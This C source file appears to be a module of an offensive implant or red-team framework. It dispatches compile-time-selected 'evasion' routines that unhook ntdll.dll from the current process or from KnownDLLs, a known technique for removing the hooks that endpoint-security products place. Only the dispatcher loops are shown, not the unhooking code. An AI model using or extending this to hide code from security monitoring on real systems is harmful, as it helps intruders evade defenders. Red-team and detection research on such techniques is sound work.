#include "../../includes/core/core.h"
#include "../../includes/evasion/evasion.h"

#ifdef EVASION_UNHOOK_NTDLL_PROCESS
#include "../../includes/evasion/methods/unhook-process.h"
#endif

#ifdef EVASION_UNHOOK_NTDLL_KNOWNDLLS
#include "../../includes/evasion/methods/ntdll-unhook-knowndlls.h"
#endif


typedef BOOL(*EvasionFunc)(void);
typedef BOOL(*EvasionApiLoad)(void);

static EvasionApiLoad evasion_api_loaders[] = {
#ifdef EVASION_UNHOOK_NTDLL_PROCESS
    evasion_unhook_ntdll_process_load_apis,
#endif
#ifdef EVASION_UNHOOK_NTDLL_KNOWNDLLS
    evasion_unhook_ntdll_knowndlls_load_apis,
#endif
    NULL
};

static EvasionFunc evasions[] = {
#ifdef EVASION_UNHOOK_NTDLL_PROCESS
    evasion_unhook_ntdll_process,
#endif
#ifdef EVASION_UNHOOK_NTDLL_KNOWNDLLS
    evasion_unhook_ntdll_knowndlls,
#endif
    NULL
};


BOOL evasion_load_apis(void) {
    for (int i = 0; evasion_api_loaders[i] != NULL; i++) {
        if (!evasion_api_loaders[i]()) return FALSE;
    }
    return TRUE;
}

BOOL evasion_run(void) {
    for (int i = 0; evasions[i] != NULL; i++) {
        if (!evasions[i]()) return FALSE;
    }
    return TRUE;
}
